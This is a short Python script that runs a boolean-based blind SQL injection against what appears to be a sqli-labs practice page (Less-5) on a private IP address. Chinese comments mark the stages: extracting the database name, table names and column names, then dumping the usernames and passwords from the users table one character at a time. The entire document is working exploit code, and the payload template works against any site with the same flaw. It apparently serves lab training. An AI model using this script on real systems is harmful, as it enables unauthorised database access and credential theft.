#!/usr/bin/python3

import requests

url = 'http://192.168.115.142/sqli/Less-5/index.php'
result = ''
for i in range(1,200):
    s = requests.Session()
    for j in range(32,128):
        # payload = f"1' and (ascii(substr(database(),{i},1)) = {j}) #" #爆破数据库名
        # payload =f"1' and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='数据库名'),{i},1))={j}) #" #爆破表明
        # payload=f"1' and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='数据库名'),{i},1))={j}) #" #爆破字段名
        payload = f"1' and (ascii(substr((select group_concat(concat(username,' ',password)) from users),{i},1))={j}) #" #爆破数据库
        params = {"id":payload}
        r = s.get(url=url,params=params)
        if "You are in" in r.text:
            result = result + chr(j)
            break

print(result)
